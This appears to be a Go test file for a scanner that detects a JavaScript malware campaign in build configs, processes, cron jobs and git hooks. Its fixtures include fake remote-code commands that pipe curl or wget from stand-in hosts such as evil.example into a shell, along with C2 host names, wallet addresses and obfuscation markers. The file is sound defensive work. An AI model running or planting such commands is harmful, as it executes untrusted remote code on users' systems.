package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestMatchProcessCmd(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		reason  string
		matched bool
	}{
		{
			name:    "global access eval",
			cmd:     `node -e global["!"] something`,
			reason:  "eval with global[] access",
			matched: true,
		},
		{
			name:    "global bracket variant",
			cmd:     `node -e 'var x=global["payload"]'`,
			reason:  "eval with global[] access",
			matched: true,
		},
		{
			name:    "V equals -22 signature",
			cmd:     `node app.js _V something =-22 payload`,
			reason:  "_V=-22 signature in command",
			matched: true,
		},
		{
			name:    "Gez call",
			cmd:     `node server.js Gez(encoded_data)`,
			reason:  "Gez() call in command",
			matched: true,
		},
		{
			name:    "renamed binary still matches",
			cmd:     `/usr/local/bin/loader -e global["!"] payload`,
			reason:  "eval with global[] access",
			matched: true,
		},
		{
			name:    "non-node interpreter still matches Gez signature",
			cmd:     `bun run /tmp/x.js Gez(data)`,
			reason:  "Gez() call in command",
			matched: true,
		},
		{
			name:    "legitimate node app",
			cmd:     `node /usr/local/bin/serve`,
			matched: false,
		},
		{
			name:    "node with -e but no global",
			cmd:     `node -e "console.log('hello')"`,
			matched: false,
		},
		{
			name:    "empty command",
			cmd:     "",
			matched: false,
		},
		{
			name:    "global without -e flag",
			cmd:     `node app.js global["test"]`,
			matched: false,
		},
		{
			name:    "_V without =-22",
			cmd:     `node _V_module.js`,
			matched: false,
		},
		{
			name:    "Gez without parens",
			cmd:     `node Gez_module.js`,
			matched: false,
		},
		{
			name:    "case sensitive Gez",
			cmd:     `node server.js gez(data)`,
			matched: false,
		},
		{
			name:    "wallet address in command",
			cmd:     `node -r ./payload.js TMfKQEd7TJJa5xNZJZ2Lep`,
			reason:  "wallet/campaign id in command: TMfKQEd7TJJa5xNZJZ2Lep",
			matched: true,
		},
		{
			name:    "campaign id A7-2259 in command",
			cmd:     `node loader.js A7-2259`,
			reason:  "wallet/campaign id in command: A7-2259",
			matched: true,
		},
		{
			name:    "campaign id C5-022526 in command",
			cmd:     `node x C5-022526 y`,
			reason:  "wallet/campaign id in command: C5-022526",
			matched: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason, matched := matchProcessCmd(tt.cmd)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && reason != tt.reason {
				t.Errorf("reason = %q, want %q", reason, tt.reason)
			}
		})
	}
}

func TestIsBuildConfigFile(t *testing.T) {
	tests := []struct {
		name string
		file string
		want bool
	}{
		{"next config js", "next.config.js", true},
		{"postcss config js", "postcss.config.js", true},
		{"tailwind config mjs", "tailwind.config.mjs", true},
		{"vite config ts", "vite.config.ts", true},
		{"webpack config cjs", "webpack.config.cjs", true},
		{"babel config js", "babel.config.js", true},
		{"rollup config ts", "rollup.config.ts", true},
		{"unknown tool config", "frobnicate.config.js", true},
		{"mixed case", "PostCSS.Config.JS", true},

		{"package json", "package.json", false},
		{"tsconfig json", "tsconfig.json", false},
		{"plain js", "index.js", false},
		{"config without dot prefix", "myconfig.js", false},
		{"hidden dot config", ".config.js", false},
		{"wrong extension", "next.config.json", false},
		{"empty name", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isBuildConfigFile(tt.file)
			if got != tt.want {
				t.Errorf("isBuildConfigFile(%q) = %v, want %v", tt.file, got, tt.want)
			}
		})
	}
}

func TestMatchWalletString(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		want    string
		matched bool
	}{
		{"tron address", "addr=TMfKQEd7TJJa5xNZJZ2Lep more", "TMfKQEd7TJJa5xNZJZ2Lep", true},
		{"evm address", "wallet 0xbe037400670fbf1c here", "0xbe037400670fbf1c", true},
		{"campaign A7-2259", "id A7-2259", "A7-2259", true},
		{"campaign 5-022526", "marker 5-022526 set", "5-022526", true},
		{"campaign C5-022526", "C5-022526", "C5-022526", true},
		{"no match", "ordinary configuration content", "", false},
		{"empty", "", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, matched := matchWalletString(tt.input)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && got != tt.want {
				t.Errorf("got = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestMatchNetworkLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		host    string
		matched bool
	}{
		{
			name:    "trongrid connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "aptoslabs connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->aptoslabs.com:443 (ESTABLISHED)",
			host:    "aptoslabs",
			matched: true,
		},
		{
			name:    "bsc-dataseed connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->bsc-dataseed.binance.org:443 (ESTABLISHED)",
			host:    "bsc-dataseed",
			matched: true,
		},
		{
			name:    "publicnode connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->publicnode.com:443 (ESTABLISHED)",
			host:    "publicnode",
			matched: true,
		},
		{
			name:    "direct IP C2",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->136.0.9.8:8080 (ESTABLISHED)",
			host:    "136.0.9.8",
			matched: true,
		},
		{
			name:    "case insensitive trongrid",
			line:    "Node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->TRONGRID.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "legitimate node connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->google.com:443 (ESTABLISHED)",
			matched: false,
		},
		{
			// The node pre-filter was removed; any process calling a
			// known C2 host is now flagged so renamed loaders are caught.
			name:    "renamed process to C2",
			line:    "loader    12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "bun process to C2",
			line:    "bun       12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->aptoslabs.com:443 (ESTABLISHED)",
			host:    "aptoslabs",
			matched: true,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			host, matched := matchNetworkLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && host != tt.host {
				t.Errorf("host = %q, want %q", host, tt.host)
			}
		})
	}
}

func TestMatchPersistenceLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		keyword string
		matched bool
	}{
		{
			name:    "node eval in crontab",
			line:    "*/5 * * * * node -e 'require(\"http\").get(\"http://evil.com\")'",
			keyword: "node -e",
			matched: true,
		},
		{
			name:    "trongrid reference",
			line:    "0 * * * * curl https://trongrid.io/api",
			keyword: "trongrid",
			matched: true,
		},
		{
			name:    "binance reference",
			line:    "*/10 * * * * node check-binance.js",
			keyword: "binance",
			matched: true,
		},
		{
			name:    "curl piped to sh",
			line:    `*/5 * * * * curl -s https://example.com/payload | sh`,
			keyword: "curl | sh",
			matched: true,
		},
		{
			name:    "curl piped to bash no space",
			line:    `0 * * * * curl https://x.example/y |bash`,
			keyword: "curl | sh",
			matched: true,
		},
		{
			name:    "wget piped to bash",
			line:    `* * * * * wget -qO- https://x | bash`,
			keyword: "wget | sh",
			matched: true,
		},
		{
			name:    "campaign id in persistence line",
			line:    `*/15 * * * * /usr/local/bin/loader C5-022526`,
			keyword: "wallet/campaign id: C5-022526",
			matched: true,
		},
		{
			name:    "legitimate cron job",
			line:    "0 2 * * * /usr/local/bin/backup.sh",
			matched: false,
		},
		{
			name:    "node without -e",
			line:    "*/5 * * * * node /app/server.js",
			matched: false,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			keyword, matched := matchPersistenceLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && keyword != tt.keyword {
				t.Errorf("keyword = %q, want %q", keyword, tt.keyword)
			}
		})
	}
}

func TestMatchConfigContent(t *testing.T) {
	tests := []struct {
		name    string
		content string
		marker  string
		matched bool
	}{
		{
			name:    "global bang marker",
			content: `module.exports = { webpack: (config) => { global["!"] = true; return config; } }`,
			marker:  `global["!"]`,
			matched: true,
		},
		{
			name:    "c266 obfuscation marker",
			content: `const _$_c266 = ["\\x68\\x74\\x74\\x70"];`,
			marker:  "_$_c266",
			matched: true,
		},
		{
			name:    "fromCharCode marker",
			content: `var s = String.fromCharCode(127) + payload;`,
			marker:  "fromCharCode(127)",
			matched: true,
		},
		{
			name:    "clean config",
			content: `module.exports = { reactStrictMode: true }`,
			matched: false,
		},
		{
			name:    "empty content",
			content: "",
			matched: false,
		},
		{
			name:    "postcss config with wallet address",
			content: `module.exports = { plugins: { /* TMfKQEd7TJJa5xNZJZ2Lep */ } }`,
			marker:  "wallet/campaign id: TMfKQEd7TJJa5xNZJZ2Lep",
			matched: true,
		},
		{
			name:    "config with campaign id",
			content: `// build tag A7-2259\nmodule.exports = {}`,
			marker:  "wallet/campaign id: A7-2259",
			matched: true,
		},
		{
			name:    "config with evm wallet",
			content: `const target = "0xbe037400670fbf1c";`,
			marker:  "wallet/campaign id: 0xbe037400670fbf1c",
			matched: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			marker, matched := matchConfigContent(tt.content)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && marker != tt.marker {
				t.Errorf("marker = %q, want %q", marker, tt.marker)
			}
		})
	}
}

func TestScanConfigsWithInfectedFile(t *testing.T) {
	dir := t.TempDir()

	infected := filepath.Join(dir, "next.config.js")
	os.WriteFile(infected, []byte(`module.exports = { global["!"] = true }`), 0644)

	clean := filepath.Join(dir, "next.config.mjs")
	os.WriteFile(clean, []byte(`export default { reactStrictMode: true }`), 0644)

	// Test matchConfigContent directly since scanConfigs uses hardcoded dirs
	infectedData, _ := os.ReadFile(infected)
	marker, matched := matchConfigContent(string(infectedData))
	if !matched {
		t.Error("infected config should match")
	}
	if marker != `global["!"]` {
		t.Errorf("marker = %q, want global[\"!\"]", marker)
	}

	cleanData, _ := os.ReadFile(clean)
	_, matched = matchConfigContent(string(cleanData))
	if matched {
		t.Error("clean config should not match")
	}
}

func TestScanContentForPersistence(t *testing.T) {
	tests := []struct {
		name         string
		content      string
		descriptor   string
		identifier   string
		wantHits     int
		wantInDetail string
	}{
		{
			name:         "node -e",
			content:      `*/5 * * * * node -e require('http').get('http://x')`,
			descriptor:   "crontab line",
			identifier:   "user",
			wantHits:     1,
			wantInDetail: "node -e",
		},
		{
			name:         "curl piped to sh",
			content:      `bash -c "curl https://evil.example | sh"`,
			descriptor:   "git hook",
			identifier:   "/tmp/hook",
			wantHits:     1,
			wantInDetail: "curl | sh",
		},
		{
			name:         "wallet id",
			content:      `<plist><string>A7-2259</string></plist>`,
			descriptor:   "macOS login item",
			identifier:   "/path/x",
			wantHits:     1,
			wantInDetail: "A7-2259",
		},
		{
			name:         "JS payload marker",
			content:      `module.exports = { f: function(){ global["!"] } }`,
			descriptor:   "git hook",
			identifier:   "/repo/.git/hooks/pre-commit",
			wantHits:     1,
			wantInDetail: `global["!"]`,
		},
		{
			name:       "clean",
			content:    "export PATH=$PATH:/usr/local/bin\nalias ll='ls -la'\n",
			descriptor: "shell rc",
			identifier: "/Users/x/.zshrc",
			wantHits:   0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hits := scanContentForPersistence(tt.content, tt.descriptor, tt.identifier)
			if len(hits) != tt.wantHits {
				t.Fatalf("got %d hits, want %d: %+v", len(hits), tt.wantHits, hits)
			}
			if tt.wantHits > 0 && tt.wantInDetail != "" {
				if !strings.Contains(hits[0].Detail, tt.wantInDetail) {
					t.Errorf("Detail %q does not contain %q", hits[0].Detail, tt.wantInDetail)
				}
				if !strings.Contains(hits[0].Detail, tt.identifier) {
					t.Errorf("Detail %q does not contain identifier %q", hits[0].Detail, tt.identifier)
				}
				if !strings.Contains(hits[0].Detail, tt.descriptor) {
					t.Errorf("Detail %q does not contain descriptor %q", hits[0].Detail, tt.descriptor)
				}
			}
		})
	}
}

func TestScanGitHooksInDir(t *testing.T) {
	root := t.TempDir()

	// Repo with a malicious post-checkout hook.
	repo1 := filepath.Join(root, "repo1")
	hooks1 := filepath.Join(repo1, ".git", "hooks")
	if err := os.MkdirAll(hooks1, 0o755); err != nil {
		t.Fatal(err)
	}
	maliciousHook := filepath.Join(hooks1, "post-checkout")
	if err := os.WriteFile(maliciousHook,
		[]byte("#!/bin/sh\ncurl https://evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	// Sample hook should be ignored.
	sampleHook := filepath.Join(hooks1, "pre-commit.sample")
	if err := os.WriteFile(sampleHook,
		[]byte("#!/bin/sh\ncurl https://evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	// Repo with a clean hook (should produce no detection).
	repo2 := filepath.Join(root, "repo2")
	hooks2 := filepath.Join(repo2, ".git", "hooks")
	if err := os.MkdirAll(hooks2, 0o755); err != nil {
		t.Fatal(err)
	}
	cleanHook := filepath.Join(hooks2, "pre-commit")
	if err := os.WriteFile(cleanHook,
		[]byte("#!/bin/sh\nexec /usr/local/bin/lint \"$@\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	// File at hooks-like path but NOT inside .git should be ignored.
	notInGit := filepath.Join(root, "notgit", "hooks")
	if err := os.MkdirAll(notInGit, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(notInGit, "post-checkout"),
		[]byte("#!/bin/sh\ncurl https://evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	hits := scanGitHooksInDir(context.Background(), root)
	if len(hits) != 1 {
		t.Fatalf("got %d hits, want 1: %+v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Detail, "post-checkout") {
		t.Errorf("expected hit on post-checkout hook, got %q", hits[0].Detail)
	}
	if !strings.Contains(hits[0].Detail, "git hook") {
		t.Errorf("expected descriptor 'git hook', got %q", hits[0].Detail)
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input string
		max   int
		want  string
	}{
		{"hello", 10, "hello"},
		{"hello", 5, "hello"},
		{"hello world", 5, "hello..."},
		{"", 5, ""},
		{"ab", 1, "a..."},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.max)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.max, got, tt.want)
		}
	}
}
